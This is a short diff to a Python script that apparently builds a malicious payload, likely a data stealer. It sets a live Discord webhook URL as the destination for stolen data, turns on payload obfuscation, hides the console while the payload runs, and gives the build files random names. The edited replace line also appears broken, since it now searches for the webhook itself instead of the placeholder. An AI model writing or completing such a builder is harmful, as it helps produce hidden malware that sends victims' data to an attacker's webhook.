@@ -18,7 +18,7 @@ except ImportError:
 version = "1.0"
 
 webhook = "https://discord.com/api/webhooks/1335514430850601071/50AL7KFqOMpFHHkGHDNUaOIrSySXAgUpxVWR9ZpirH0m-wZbnfz_fHod-VxlBPq-OoTU" # Webhook URL
-obfuscate = False # Obfuscate the payload
+obfuscate = True # Obfuscate the payload
 hideConsole = True # Hide the console when the payload is ran
 forceRead = False
 virtualenvir = False
@@ -36,7 +36,7 @@ def build():
     _filename = ''.join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for i in range(10)])
     filename = _filename + "_tmp.py"
 
-    data = data.replace("WEBHOOK GOES HERE", webhook)
+    data = data.replace("https://discord.com/api/webhooks/1335514430850601071/50AL7KFqOMpFHHkGHDNUaOIrSySXAgUpxVWR9ZpirH0m-wZbnfz_fHod-VxlBPq-OoTU", webhook)
     data = data.replace("forceRead = False", f"forceRead = {forceRead}")
 
     if obfuscate:
